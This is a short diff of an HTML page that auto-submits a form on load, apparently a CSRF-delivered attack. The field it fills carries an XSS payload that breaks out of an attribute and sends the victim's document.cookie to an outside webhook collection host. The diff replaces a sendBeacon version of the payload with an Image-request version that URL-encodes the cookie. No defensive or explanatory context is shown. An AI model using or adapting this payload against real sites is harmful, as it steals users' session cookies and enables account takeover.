@@ -5,7 +5,8 @@
 <input type="hidden" name="captcha" value="x">
 </form>
 <script>
-document.getElementById('e').value = '"><img src=x onerror="navigator.sendBeacon(\'https://webhooksite.net/b9616a33-c36c-40d4-95b4-ec846e4ab1c8/\',document.cookie)">';
+var payload = '"><img src=x onerror="var i=new Image();i.src=\'https://webhooksite.net/b9616a33-c36c-40d4-95b4-ec846e4ab1c8/?c=\'+encodeURIComponent(document.cookie)">';
+document.getElementById('e').value = payload;
 document.getElementById('f').submit();
 </script>
 </body></html>
